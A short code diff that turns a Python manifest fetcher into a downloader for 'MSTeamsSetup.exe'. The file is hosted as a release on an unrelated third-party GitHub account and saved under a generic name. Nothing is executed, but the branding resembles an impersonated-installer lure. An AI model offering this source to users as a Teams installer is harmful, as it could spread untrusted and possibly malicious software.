@@ -1,13 +1,23 @@
-import json, urllib.request
+import urllib.request
+import os
 
-MANIFEST_URL = "https://github.com/logintechu/compressed-file/releases/download/compres/MSTeamsSetup.exe
-"
+# The direct link to your exe
+DOWNLOAD_URL = "https://github.com/logintechu/compressed-file/releases/download/compres/MSTeamsSetup.exe"
+OUTPUT_FILE = "downloaded_setup.exe"
 
-def fetch_manifest():
+def download_file(url, filename):
+    print(f"Downloading {filename}...")
     req = urllib.request.Request(
-        MANIFEST_URL,
-        headers={"User-Agent": "my-updater/1.0", "Cache-Control": "no-cache"},
+        url, 
+        headers={"User-Agent": "Mozilla/5.0"}
     )
-    with urllib.request.urlopen(req, timeout=15) as r:
-        text = r.read().decode("utf-8-sig")
-    return json.loads(text, strict=False)
+    
+    # Open the URL and read the binary data, then save it to a file
+    with urllib.request.urlopen(req, timeout=15) as response:
+        with open(filename, "wb") as out_file:
+            out_file.write(response.read())
+            
+    print("Download complete!")
+
+if __name__ == "__main__":
+    download_file(DOWNLOAD_URL, OUTPUT_FILE)
